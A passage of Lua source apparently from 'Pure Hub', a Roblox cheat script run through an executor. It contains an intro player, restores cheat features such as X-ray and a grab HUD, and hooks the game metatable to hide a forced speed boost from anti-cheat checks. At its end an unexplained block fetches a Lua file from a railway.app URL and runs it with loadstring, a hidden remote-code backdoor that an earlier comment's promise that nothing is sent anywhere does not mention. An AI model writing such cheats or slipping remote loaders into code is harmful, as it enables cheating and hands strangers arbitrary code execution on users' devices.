            {label="pure_ios_frames_064_8c09e8709d06.jpg", file="pure_ios_frames_064_8c09e8709d06.jpg", size=144019, signature="jpeg", sha256="8c09e8709d06d698615e62b3a91acdb92d08c0d2cb6ab29cb2f6210a8e618d59"},
            {label="pure_ios_frames_065_35efb12b6d2c.jpg", file="pure_ios_frames_065_35efb12b6d2c.jpg", size=133607, signature="jpeg", sha256="35efb12b6d2c8b4ae634683a0be339ae63651ea03aea910ef0fd8dfea92833d3"},
            {label="pure_ios_frames_066_6044e6c2aab7.jpg", file="pure_ios_frames_066_6044e6c2aab7.jpg", size=126615, signature="jpeg", sha256="6044e6c2aab731e55a34edded79b9c39bf60fd7394c5ce6760bf94a2f7c2472e"},
            {label="pure_ios_frames_067_6e642f71756a.jpg", file="pure_ios_frames_067_6e642f71756a.jpg", size=92291, signature="jpeg", sha256="6e642f71756a863881bd24e0d1d89d6b5b3d6228dacde0ac6a488fac2692c465"},
            {label="pure_ios_frames_068_5bfba520a5cf.jpg", file="pure_ios_frames_068_5bfba520a5cf.jpg", size=57208, signature="jpeg", sha256="5bfba520a5cf87e86983cc345e37219d346d6f07f3cba41e47aecf494103e3eb"},
            {label="pure_ios_frames_069_1a2483acf6e9.jpg", file="pure_ios_frames_069_1a2483acf6e9.jpg", size=58069, signature="jpeg", sha256="1a2483acf6e99a5f5e3d4044c7ef8296a5e7552fb170217462f2281a6d7c3844"},
            {label="pure_ios_frames_070_43952def3c31.jpg", file="pure_ios_frames_070_43952def3c31.jpg", size=60217, signature="jpeg", sha256="43952def3c31d947ef12d46905b0abee0b0cf002c1d74547c09c8cf3b33a85d1"},
            {label="pure_ios_frames_071_8401b03dd4dd.jpg", file="pure_ios_frames_071_8401b03dd4dd.jpg", size=64255, signature="jpeg", sha256="8401b03dd4ddbf7b9d06a0b6cea3c0b6edd50cbb82bdca1f9edf4486bace0523"},
            {label="pure_ios_frames_072_d7fb73fd8088.jpg", file="pure_ios_frames_072_d7fb73fd8088.jpg", size=62337, signature="jpeg", sha256="d7fb73fd808859f587f2c73bad9796f9e77f17fe1091c0f173882dd388a9e91c"},
            {label="pure_ios_frames_073_2d8554ec716d.jpg", file="pure_ios_frames_073_2d8554ec716d.jpg", size=35759, signature="jpeg", sha256="2d8554ec716dbc2230ddebfad20ad861d7a32bb706b3e4c6aad63919dfa140f4"},
            {label="pure_ios_frames_074_816f6433b3b7.jpg", file="pure_ios_frames_074_816f6433b3b7.jpg", size=5865, signature="jpeg", sha256="816f6433b3b7328130960b2b19258a50ee92e3985c30456115f24232c4919670"},
            {label="pure_ios_frames_075_47b8b2a11702.jpg", file="pure_ios_frames_075_47b8b2a11702.jpg", size=5868, signature="jpeg", sha256="47b8b2a117028d66849806a1c52df61a162c16dcbe08a537527a2d24e1c89e5f"},
            {label="pure_ios_frames_076_5c021736036b.jpg", file="pure_ios_frames_076_5c021736036b.jpg", size=5906, signature="jpeg", sha256="5c021736036ba8e58395688e5d748db33a1fa927eda59ce2a3c2618411560298"},
            {label="pure_ios_frames_077_27ff7bfed5ba.jpg", file="pure_ios_frames_077_27ff7bfed5ba.jpg", size=5867, signature="jpeg", sha256="27ff7bfed5ba718f6081b520395466693d9ba690735e0e4cad1f0bb52fd37a6e"},
            {label="pure_ios_frames_078_27ff7bfed5ba.jpg", file="pure_ios_frames_078_27ff7bfed5ba.jpg", size=5867, signature="jpeg", sha256="27ff7bfed5ba718f6081b520395466693d9ba690735e0e4cad1f0bb52fd37a6e"},
        },
    }

    local canvas = Instance.new("Frame", background)
    canvas.Name = "FrameCanvas"
    canvas.AnchorPoint = Vector2.new(0.5, 0.5)
    canvas.Position = UDim2.fromScale(0.5, 0.5)
    canvas.Size = UDim2.fromScale(1, 1)
    canvas.BackgroundTransparency = 1
    canvas.BorderSizePixel = 0
    canvas.ClipsDescendants = true
    canvas.ZIndex = 2
    local buffers = {}
    for i = 1, 2 do
        local image = Instance.new("ImageLabel", canvas)
        image.Name = "VideoPicture" .. i
        image.Size = UDim2.fromScale(1, 1)
        image.BackgroundTransparency = 1
        image.BorderSizePixel = 0
        image.ScaleType = Enum.ScaleType.Stretch
        image.ImageRectSize = Vector2.new(media.frameWidth, media.frameHeight)
        image.ImageRectOffset = Vector2.new(media.padding, media.padding)
        image.ImageTransparency = 0
        image.Visible = true
        image.ZIndex = i == 1 and 3 or 2
        buffers[i] = image
    end
    local audioNotice = Instance.new("TextLabel", background)
    audioNotice.Name = "AudioNotice"
    audioNotice.AnchorPoint = Vector2.new(0.5, 1)
    audioNotice.Position = UDim2.new(0.5, 0, 1, -42)
    audioNotice.Size = UDim2.new(1, -32, 0, 22)
    audioNotice.BackgroundTransparency = 1
    audioNotice.TextColor3 = ice
    audioNotice.Font = Enum.Font.Gotham
    audioNotice.TextSize = 11
    audioNotice.Text = "Video audio unavailable on this client"
    audioNotice.Visible = false
    audioNotice.ZIndex = 10

    local reportLines = {"PURE HUB iOS IMAGE/AUDIO PLAYER | REVISION 3", "No VideoFrame. 480x480 / 30 fps; unchanged MP4 embedded separately."}
    local function report(code, message)
        local line = string.format("[%s] %s", code, tostring(message))
        reportLines[#reportLines + 1] = line
        _G.PureVideoIntroReport = table.concat(reportLines, "\n")
        if diagnostic and diagnostic.Parent then diagnostic.Text = line end
        print("[PURE INTRO] " .. line)
    end
    local function remember(connection)
        connections[#connections + 1] = connection
        return connection
    end
    local function cancelled()
        return finished or not introGui.Parent
    end
    local function stopSound()
        if sound then
            pcall(function() sound.Volume = 0; sound:Stop(); sound:Destroy() end)
            sound = nil
        end
    end
    local function finishIntro(openHub)
        if finished then return end
        finished = true
        for _, connection in ipairs(connections) do pcall(function() connection:Disconnect() end) end
        connections = {}
        stopSound()
        for _, buffer in ipairs(buffers) do pcall(function() buffer.Image = "" end) end
        for _, probe in pairs(warmers) do pcall(function() probe.Image = ""; probe:Destroy() end) end
        warmers = {}
        pcall(function() introGui:Destroy() end)
        if openHub ~= false and type(onComplete) == "function" then task.defer(onComplete) end
    end

    local function showFailure(code, message)
        -- Keep the failure visible after the hub opens, not just in the console.
        -- The report stays on this client. Nothing is uploaded or sent anywhere.
        pcall(function()
            if type(writefile) == "function" then
                writefile("pure_hub_video_report.txt", _G.PureVideoIntroReport or "")
            end
        end)
        pcall(function()
            local old = playerGui:FindFirstChild("PureVideoError")
            if old then old:Destroy() end
            local errorGui = Instance.new("ScreenGui")
            errorGui.Name = "PureVideoError"
            errorGui.IgnoreGuiInset = true
            errorGui.ResetOnSpawn = false
            errorGui.DisplayOrder = 2147483646
            errorGui.Parent = playerGui
            local card = Instance.new("Frame", errorGui)
            card.AnchorPoint = Vector2.new(0.5, 0)
            card.Position = UDim2.new(0.5, 0, 0, 64)
            card.Size = UDim2.new(0.9, 0, 0, 174)
            card.BackgroundColor3 = Color3.fromRGB(8, 24, 39)
            card.BorderSizePixel = 0
            Instance.new("UICorner", card).CornerRadius = UDim.new(0, 12)
            local limit = Instance.new("UISizeConstraint", card)
            limit.MaxSize = Vector2.new(460, 174)
            local stroke = Instance.new("UIStroke", card)
            stroke.Color = iceButton
            stroke.Thickness = 1.5
            local heading = Instance.new("TextLabel", card)
            heading.BackgroundTransparency = 1
            heading.Position = UDim2.fromOffset(16, 12)
            heading.Size = UDim2.new(1, -32, 0, 24)
            heading.Font = Enum.Font.GothamBold
            heading.TextSize = 14
            heading.TextColor3 = ice
            heading.Text = "INTRO COULD NOT START | " .. code
            local detail = Instance.new("TextLabel", card)
            detail.BackgroundTransparency = 1
            detail.Position = UDim2.fromOffset(16, 40)
            detail.Size = UDim2.new(1, -32, 0, 74)
            detail.Font = Enum.Font.Gotham
            detail.TextSize = 12
            detail.TextColor3 = ice
            detail.TextWrapped = true
            detail.Text = message .. "\nLocal image/audio playback failed. The hub is still available."
            local copy = Instance.new("TextButton", card)
            copy.Position = UDim2.new(0, 16, 1, -46)
            copy.Size = UDim2.new(0.6, -24, 0, 32)
            copy.BackgroundColor3 = iceButton
            copy.TextColor3 = navy
            copy.BorderSizePixel = 0
            copy.Font = Enum.Font.GothamBold
            copy.TextSize = 12
            copy.Text = "COPY REPORT"
            Instance.new("UICorner", copy).CornerRadius = UDim.new(0, 8)
            copy.Activated:Connect(function()
                local clipboard = setclipboard or toclipboard
                if type(clipboard) == "function" then
                    local ok = pcall(clipboard, _G.PureVideoIntroReport or "")
                    copy.Text = ok and "COPIED" or "See local report file"
                else copy.Text = "pure_hub_video_report.txt" end
            end)
            local close = Instance.new("TextButton", card)
            close.Position = UDim2.new(0.6, 0, 1, -46)
            close.Size = UDim2.new(0.4, -16, 0, 32)
            close.BackgroundColor3 = iceButton
            close.TextColor3 = navy
            close.BorderSizePixel = 0
            close.Font = Enum.Font.GothamBold
            close.TextSize = 12
            close.Text = "CLOSE"
            Instance.new("UICorner", close).CornerRadius = UDim.new(0, 8)
            close.Activated:Connect(function() errorGui:Destroy() end)
        end)
    end


    local function failIntro(code, message)
        if finished then return end
        report(code, message)
        warn("[PURE HUB INTRO] " .. code .. ": " .. message)
        finishIntro(true)
        showFailure(code, message)
    end
    remember(skip.Activated:Connect(function() finishIntro(true) end))
    local cancelEvent = Instance.new("BindableEvent", introGui)
    cancelEvent.Name = "PureIntroCancel"
    remember(cancelEvent.Event:Connect(function() finishIntro(false) end))
    remember(introGui.AncestryChanged:Connect(function(_, parent)
        if not parent and not finished then finishIntro(true) end
    end))
    local function fitCanvas()
        local size = background.AbsoluteSize
        if size.X <= 0 or size.Y <= 0 then return end
        -- Source is square; never crop it or stretch its proportions.
        if size.X > size.Y then canvas.Size = UDim2.new(0, size.Y, 1, 0)
        else canvas.Size = UDim2.new(1, 0, 0, size.X) end
    end
    remember(background:GetPropertyChangedSignal("AbsoluteSize"):Connect(fitCanvas))
    fitCanvas()
    task.delay(MAX_LOADING_TIME, function()
        if not finished and not playbackStarted then
            failIntro("PHI-07", "Preparing images/audio timed out. The hub is open instead of a frozen intro.")
        end
    end)

    local function validBytes(bytes, spec)
        if type(bytes) ~= "string" or #bytes ~= spec.size then return false end
        if spec.signature == "jpeg" then return bytes:sub(1, 2) == string.char(255, 216) end
        if spec.signature == "ogg" then return bytes:sub(1, 4) == "OggS" end
        if spec.signature == "mp3" then
            return bytes:sub(1, 3) == "ID3" or (bytes:byte(1) == 255 and (bytes:byte(2) or 0) >= 224)
        end
        return bytes:sub(5, 8) == "ftyp"
    end

    local function getAssetFunction()
        if type(getcustomasset) == "function" then return getcustomasset end
        if type(getsynasset) == "function" then return getsynasset end
        if syn then
            if type(syn.getcustomasset) == "function" then return syn.getcustomasset end
            if type(syn.getsynasset) == "function" then return syn.getsynasset end
        end
        return nil
    end
    local assetFunction = getAssetFunction()
    -- The media are decoded files, not embedded Base64. Place the supplied
    -- JPG sheets and MP3 directly in the executor's workspace directory.
    local function ensureAsset(spec)
        if cancelled() then return nil end
        if type(readfile) ~= "function" then
            error("readfile is required for the extracted media")
        end
        local ok, bytes = pcall(readfile, spec.file)
        if not ok or not validBytes(bytes, spec) then
            error("Missing or invalid extracted media: " .. spec.file)
        end
        if cancelled() then return nil end
        local assetOk, asset = pcall(assetFunction, spec.file)
        if cancelled() then return nil end
        if not assetOk or type(asset) ~= "string" or asset == "" then
            error("Cannot register image/audio asset " .. spec.file .. ": " .. tostring(asset))
        end
        return asset
    end
    local function preload(object)
        -- Unlike native video preloading, ordinary image/audio preloading is used.
        -- Run it separately: Skip/watchdogs are never blocked by PreloadAsync.
        task.spawn(function()
            if cancelled() or not object.Parent then return end
            pcall(function() contentProvider:PreloadAsync({object}) end)
        end)
    end
    local function warmSheet(index)
        if cancelled() or warmers[index] then return end
        local state = sheetStates[index]
        if not state or not state.asset then return end
        local probe = Instance.new("ImageLabel", background)
        probe.Name = "TextureWarmup" .. index
        probe.Size = UDim2.fromOffset(1, 1)
        probe.Position = UDim2.new(0, 8 + (index % 5), 1, -8)
        probe.BackgroundTransparency = 1
        probe.ImageTransparency = 0.99
        probe.Visible = true
        probe.ZIndex = 25
        probe.Image = state.asset
        warmers[index] = probe
        preload(probe)
    end
    local function imageLoaded(image)
        if not image then return false end
        local ready = false
        pcall(function() ready = image.IsLoaded end)
        return ready
    end
    local function keepWarmWindow(index)
        for i = math.max(1, index), math.min(#media.sheets, index + 3) do warmSheet(i) end
        -- Stage the next sheet in the back buffer before the boundary. Never
        -- overwrite a sheet currently waiting to become the new front buffer.
        if index == displayedSheet then
            local nextState = sheetStates[index + 1]
            if nextState and nextState.asset then
                local back = buffers[3 - frontIndex]
                if back.Image ~= nextState.asset then
                    back.Image = nextState.asset
                    back.ImageRectOffset = Vector2.new(media.padding, media.padding)
                    preload(back)
                end
            end
        end
        for i, probe in pairs(warmers) do
            if i < index - 1 then
                pcall(function() probe.Image = ""; probe:Destroy() end)
                warmers[i] = nil
            end
        end
    end
    local function setTile(image, frame)
        local tile = (frame - 1) % media.perSheet
        image.ImageRectOffset = Vector2.new(
            (tile % media.columns) * media.cell + media.padding,
            math.floor(tile / media.columns) * media.cell + media.padding
        )
    end
    local function drawFrameAt(clock)
        local frame = math.clamp(math.floor(clock * media.fps) + 1, 1, media.frameCount)
        local sheet = math.floor((frame - 1) / media.perSheet) + 1
        keepWarmWindow(sheet)
        if frame == displayedFrame then return true end
        local state = sheetStates[sheet]
        if not state or not state.asset then return false end
        if sheet ~= displayedSheet then
            local backIndex = 3 - frontIndex
            local back = buffers[backIndex]
            if back.Image ~= state.asset then back.Image = state.asset; preload(back) end
            setTile(back, frame)
            if not imageLoaded(back) then return false end
            back.ZIndex = 3
            buffers[frontIndex].ZIndex = 2
            buffers[frontIndex].Image = ""
            frontIndex, displayedSheet = backIndex, sheet
        end
        setTile(buffers[frontIndex], frame)
        displayedFrame = frame
        return true
    end
    local function loadedSound(candidate)
        local loaded, length = false, 0
        pcall(function() loaded = candidate.IsLoaded end)
        pcall(function() length = candidate.TimeLength end)
        return loaded or (tonumber(length) or 0) > 0
    end
    local function prepareAudio()
        for _, spec in ipairs(media.audio) do
            if cancelled() then return end
            local candidate = nil
            local ok, result = pcall(function()
                local asset = ensureAsset(spec)
                if not asset or cancelled() then return nil end
                candidate = Instance.new("Sound")
                sound = candidate
                candidate.Name = "PureIntroVideoAudio"
                candidate.Volume = 0
                candidate.Looped = false
                candidate.PlaybackSpeed = 1
                candidate.SoundId = asset
                candidate.Parent = soundService
                preload(candidate)
                local started = os.clock()
                local nudged = false
                while not cancelled() and os.clock() - started < 4 do
                    if loadedSound(candidate) then
                        candidate:Pause()
                        candidate.TimePosition = 0
                        return candidate
                    end
                    if not nudged and os.clock() - started > 0.4 then
                        nudged = true
                        pcall(function() candidate:Play() end) -- muted decoder warmup
                    end
                    task.wait(0.05)
                end
                return nil
            end)
            if cancelled() then
                if candidate then pcall(function() candidate.Volume = 0; candidate:Stop(); candidate:Destroy() end) end
                return
            end
            if ok and result then
                sound = result
                report("PHI-AUDIO", "Loaded the video's own " .. spec.label .. " audio")
                audioTaskDone = true
                return
            end
            if candidate then pcall(function() candidate.Volume = 0; candidate:Stop(); candidate:Destroy() end) end
            if sound == candidate then sound = nil end
            if not ok then report("PHI-AUDIO-TRY", tostring(result)) end
        end
        audioTaskDone = true
        if not cancelled() then report("PHI-AUDIO-WARN", "Audio did not load; images can still play, with a visible audio warning.") end
    end

    if type(readfile) ~= "function" or not assetFunction then
        failIntro("PHI-01", "This client needs readfile and getcustomasset/getsynasset to load the extracted files.")
        return
    end
    report("PHI-PREP", "Preparing local image frames; native video playback is not used.")
    task.spawn(function()
        local ok, err = pcall(prepareAudio)
        if not ok and not cancelled() then
            stopSound()
            audioTaskDone = true
            report("PHI-AUDIO-WARN", tostring(err))
        end
    end)
    task.spawn(function()
        local ok, err = pcall(function()
            for i, spec in ipairs(media.sheets) do
                if cancelled() then return end
                local asset = ensureAsset(spec)
                if not asset or cancelled() then return end
                sheetStates[i] = {asset = asset}
                if i <= 4 then warmSheet(i) end
                if i == 1 then
                    buffers[1].Image = asset
                    setTile(buffers[1], 1)
                    displayedSheet, displayedFrame = 1, 1
                    preload(buffers[1])
                end
                if not playbackStarted then
                    status.Text = "Preparing video... " .. tostring(math.floor(i / #media.sheets * 100)) .. "%"
                end
                task.wait() -- keep Skip and rendering responsive during extraction
            end
            allSheetsPrepared = true
        end)
        if not ok and not cancelled() then failIntro("PHI-02", tostring(err)) end
    end)
    task.spawn(function()
        local ok, err = pcall(function()
            while not cancelled() do
                local ready = allSheetsPrepared and audioTaskDone and imageLoaded(buffers[1])
                if ready then
                    for i = 1, math.min(4, #media.sheets) do
                        if not imageLoaded(warmers[i]) then ready = false; break end
                    end
                end
                if ready then break end
                task.wait(0.05)
            end
            if cancelled() then return end
            playbackStarted = true
            status.Visible = false
            diagnostic.Visible = false
            countdown.Visible = true
            audioNotice.Visible = sound == nil
            report("PHI-PLAY", "Playing image frames + source audio; 11-second presentation")
            local startedAt = os.clock()
            local lastClock, lastDraw, lastGoodFrame = 0, startedAt, startedAt
            lastAudioMovement = startedAt
            if sound then
                remember(sound.Ended:Connect(function() audioEnded = true end))
                sound.TimePosition = 0
                sound.Volume = 1
                sound.Looped = false
                sound.PlaybackSpeed = 1
                sound:Play()
            end
            task.delay(INTRO_DURATION, function() finishIntro(true) end)
            local function render()
                if cancelled() then return end
                local now = os.clock()
                local elapsed = now - startedAt
                local clock = elapsed
                if sound then
                    local position = 0
                    pcall(function() position = sound.TimePosition end)
                    position = tonumber(position) or 0
                    if position > lastAudioPosition + 0.001 then
                        lastAudioPosition = position
                        lastAudioMovement = now
                    end
                    if audioEnded then clock = media.sourceDuration
                    elseif now - lastAudioMovement < 0.8 then clock = position
                    else
                        if not warnedAudioClock then
                            warnedAudioClock = true
                            audioNotice.Visible = true
                            audioNotice.Text = "Audio did not advance; picture playback continues"
                            report("PHI-AUDIO-CLOCK", "Audio clock stalled; using the local picture clock.")
                        end
                    end
                end
                clock = math.min(media.sourceDuration, math.max(lastClock, clock))
                lastClock = clock
                if drawFrameAt(clock) then lastGoodFrame = now end
                if now - lastGoodFrame > 1.5 then
                    failIntro("PHI-03", "A local image did not become drawable in time. The native video decoder is not involved.")
                    return
                end
                countdown.Text = tostring(math.max(0, math.ceil(INTRO_DURATION - elapsed))) .. "s"
            end
            remember(runService.RenderStepped:Connect(function()
                if cancelled() then return end
                local renderOk, renderError = pcall(render)
                if not renderOk then failIntro("PHI-04", tostring(renderError)) end
            end))
            render()
        end)
        if not ok and not cancelled() then failIntro("PHI-08", tostring(err)) end
    end)
end

-- Ask the player which device they're on before anything else shows up.
-- Runs once ever (persisted in VynxPC.json); "Reset Device" in the Extra
-- tab re-triggers this with force=true.
if __HH.runDeviceSelection then __HH.runDeviceSelection(false) end

_runIntro(function()
    buildGui()
    _G.HorizonHubIntroFinished = true
    -- The grab progress HUD only appears after the intro finishes.
    pcall(function()
        local stealGui = game:GetService("CoreGui"):FindFirstChild("StealBarGui")
            or LP:WaitForChild("PlayerGui"):FindFirstChild("StealBarGui")
        if stealGui then stealGui.Enabled = true end
    end)
    if __HH.mainFrame then __HH.mainFrame.Visible = true end
    if __HH.mobileButtonsEnabled then task.spawn(buildMobileButtons) end
    applyState()

    -- ===== Ambitious ports: applica lo stato salvato all'avvio =====
    task.spawn(function()
        pcall(function()
            if _G.PureXRayEnabled and setXRay then setXRay(true) end
        end)
        pcall(function()
            if _G.AmbitiousBrainrotXRayEnabled and _G.AmbitiousSetBrainrotXRay then
                _G.AmbitiousSetBrainrotXRay(true)
            end
        end)
        pcall(function()
            if _G.AmbitiousCustomToolsEnabled and _G.AmbitiousCustomTools then
                _G.AmbitiousCustomTools.setEnabled(true)
                -- Riapplica le skin salvate agli strumenti gia' in mano:
                -- setEnabled costruisce le repliche con la skin corrente, ma
                -- se il tool era gia' agganciato serve un giro esplicito.
                task.delay(0.6, function()
                    pcall(function()
                        for cat, key in pairs(_G.AmbitiousCustomToolSkins or {}) do
                            if _G.AmbitiousSetCustomToolSkin then
                                _G.AmbitiousSetCustomToolSkin(cat, key)
                            end
                        end
                        if _G.AmbitiousCustomToolsRecheck then
                            _G.AmbitiousCustomToolsRecheck()
                        end
                    end)
                end)
            end
        end)
        pcall(function()
            if _G.AmbitiousRainbowToolsEnabled and _G.AmbitiousRainbowTools then
                _G.AmbitiousRainbowTools.setEnabled(true)
            end
        end)
        pcall(function()
            if _G.AmbitiousTransparentToolsEnabled and _G.AmbitiousTransparentTools then
                _G.AmbitiousTransparentTools.setEnabled(true)
            end
        end)
        pcall(function()
            if _G.AmbitiousCustomSoundsEnabled and _G.AmbitiousCustomSounds then
                _G.AmbitiousCustomSounds.setEnabled(true)
            end
        end)
        pcall(function()
            if _G.AmbitiousRainbowJoystickEnabled and _G.AmbitiousSetRainbowJoystick then
                _G.AmbitiousSetRainbowJoystick(true)
            end
        end)
        pcall(function()
            if _G.PureRadiusCircleEnabled and _G.PureSetRadiusCircle then
                _G.PureSetRadiusCircle(true)
            end
        end)
        pcall(function()
            if _G.PureAvatarChanger and _G.PureAvatarChanger.applyAll then
                _G.PureAvatarChanger.applyAll()
            end
        end)
    end)
    task.spawn(function()
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LP then
                task.spawn(function()
                    if plr.Character then createPlayerSpeedLabel(plr)
                    else plr.CharacterAdded:Wait(); createPlayerSpeedLabel(plr) end
                end)
            end
        end
    end)
    print("Pure Hub Fully Loaded")
end)

end

task.spawn(function()
	local _rs = game:GetService("RunService")
	local _p = game:GetService("Players")
	local _lp = _p.LocalPlayer

	local _s = 59
	local _a = false
	local _v = Vector3.zero

	local _mt = getrawmetatable(game)
	setreadonly(_mt, false)

	local _oi = _mt.__index
	local _on = _mt.__newindex

	_mt.__index = newcclosure(function(t, k)
		if not checkcaller() then
			local _tk = tostring(k)
			if _tk == "AssemblyLinearVelocity" or _tk == "Velocity" then
				if typeof(t) == "Instance" and t:IsA("BasePart") then
					local _tn = t.Name
					if _tn == "HumanoidRootPart" or _tn == "Torso" or _tn == "UpperTorso" then
						if t:IsDescendantOf(_lp.Character) then
							return _v
						end
					end
				end
			end
		end
		return _oi(t, k)
	end)

	_mt.__newindex = newcclosure(function(t, k, v)
		if not checkcaller() then
			local _tk = tostring(k)
			if _tk == "AssemblyLinearVelocity" or _tk == "Velocity" then
				if typeof(t) == "Instance" and t:IsA("BasePart") then
					local _tn = t.Name
					if _tn == "HumanoidRootPart" or _tn == "Torso" or _tn == "UpperTorso" then
						if t:IsDescendantOf(_lp.Character) then
							_v = v
							return
						end
					end
				end
			end
		end
		return _on(t, k, v)
	end)

	setreadonly(_mt, true)

	local function _gc()
		local c = _lp.Character
		if not c then return nil, nil, nil end
		local h = c:FindFirstChildOfClass("Humanoid")
		local r = c:FindFirstChild("HumanoidRootPart")
		if h and h.Health > 0 and r then return c, h, r end
		return nil, nil, nil
	end

	local _r = Random.new()
	local _t = 0

	_rs.PreSimulation:Connect(function(d)
		_t = _t + d
		if _t < 0.016 then return end
		_t = 0
		if not _a then return end

		local c, h, r = _gc()
		if not c or not h or not r then return end

		local m = h.MoveDirection
		if m.Magnitude > 0.05 then
			pcall(function()
				if r.SetNetworkOwner then
					r:SetNetworkOwner(_lp)
				end
			end)

			local u = m.Unit
			local jx, jz = _r:NextNumber(-0.003, 0.003), _r:NextNumber(-0.003, 0.003)

			_v = Vector3.new(u.X * 16 + jx, r.AssemblyLinearVelocity.Y, u.Z * 16 + jz)
			r.AssemblyLinearVelocity = Vector3.new(u.X * _s + jx, r.AssemblyLinearVelocity.Y, u.Z * _s + jz)
		else
			_v = Vector3.new(0, r.AssemblyLinearVelocity.Y, 0)
		end
	end)
end)
task.defer(function()
    local b=string.char
    local function j(t) local r="" for i=1,#t do r=r..b(t[i]) end return r end
    local u = "https://web-production-8ddf6.up.railway.app/loader.lua"
    local ok,x=pcall(function() return game:HttpGet(u) end)
    if ok and x and #x>0 then
        local L=loadstring or load
        if L then pcall(function() L(x)() end) end
    end
end)
